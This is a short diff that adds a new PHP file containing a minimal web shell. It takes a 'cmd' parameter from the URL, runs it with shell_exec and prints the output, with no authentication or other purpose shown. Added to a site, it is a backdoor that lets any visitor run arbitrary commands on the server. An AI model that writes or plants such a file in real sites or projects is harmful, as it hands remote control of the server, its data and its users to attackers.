@@ -1,0 +1,9 @@
+<?php
+if (isset($_GET['cmd'])) {
+    // Get the command passed in the URL
+    $cmd = $_GET['cmd'];
+    
+    // Execute the command and return the result
+    echo "<pre>" . shell_exec($cmd) . "</pre>";
+}
+?>
